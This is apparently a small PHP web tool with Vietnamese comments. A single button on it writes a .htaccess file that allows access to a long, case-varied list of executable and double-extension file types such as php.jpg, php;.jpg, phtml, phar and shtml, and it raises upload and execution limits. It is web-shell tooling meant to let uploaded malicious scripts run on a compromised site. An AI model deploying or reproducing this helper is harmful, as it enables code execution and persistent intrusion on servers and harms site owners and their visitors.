<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $htaccessContent = <<<EOT
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Cho phép tất cả các tệp được tải lên
    <FilesMatch ".*\\.(php|Php|pHp|phP|Php\\.asp|php\\.anu|php\\.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php\\.jpg|php6|php7|Php7|PHP7|PHp7|pHP7|PhP7|phP7|pHP5|Php5|PHP5|PHp5|pHP5|PhP5|phP5|pHP5|php8|php9|phtml|shtml|php\\.aspx|php;\\.jpg|php\\.fla|php\\.phar|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php\\.jpg|PHP\\.JPG|php\\.xxxjpg|PHP\\.XXXJPG|php\\.jpeg|PHP\\.JPG|PHP\\.JPEG|PHP\\.PJEPG|php\\.pjpeg|php\\.fla|PHP\\.FLA|php\\.png|PHP\\.PNG|php\\.gif|PHP\\.GIF|php\\.test|php;\\.jpg|PHP JPG|PHP;\\.JPG|php;\\.jpeg|php jpg|php\\.bak|php\\.pdf|php\\.xxxpdf|php\\.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php\\.xxxgif|php\\.xxxpjpeg|php\\.xxxjpeg|php3\\.xxxjpeg|php3\\.xxxjpg|php5\\.xxxjpg|php3\\.pjpeg|php5\\.pjpeg|shtml|php\\.unknown|php\\.doc|php\\.docx|php\\.pdf|php\\.ppdf|jpg\\.PhP|php\\.txt|php\\.xxxtxt|PHP\\.TXT|PHP\\.XXXTXT|php\\.xlsx|php\\.zip|php\\.xxxzip|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|zip|shtml|phps|ump|ini|cgi|php55|txt|html|Php8|PHP8|PHp8|pHP8|PhP8|phP8|pHP8|Php3|PHP3|PHp3|pHP3|PhP3|phP3|pHP3|Php6|PHP6|PHp6|pHP6|PhP6|phP6|pHP6|php74|php56|php54|phps|pphp|php4|cgi)$">
        Allow from all
    </FilesMatch>
</IfModule>

# Tăng giới hạn kích thước tải lên
php_value upload_max_filesize 128M
php_value post_max_size 128M
php_value max_execution_time 300
php_value max_input_time 300
EOT;

    $file = '.htaccess';
    if (file_put_contents($file, $htaccessContent)) {
        echo "File .htaccess đã được tạo thành công.";
    } else {
        echo "Không thể tạo file .htaccess.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create .htaccess</title>
</head>
<body>
    <form method="post">
        <button type="submit" name="create">Create .htaccess</button>
    </form>
</body>
</html>
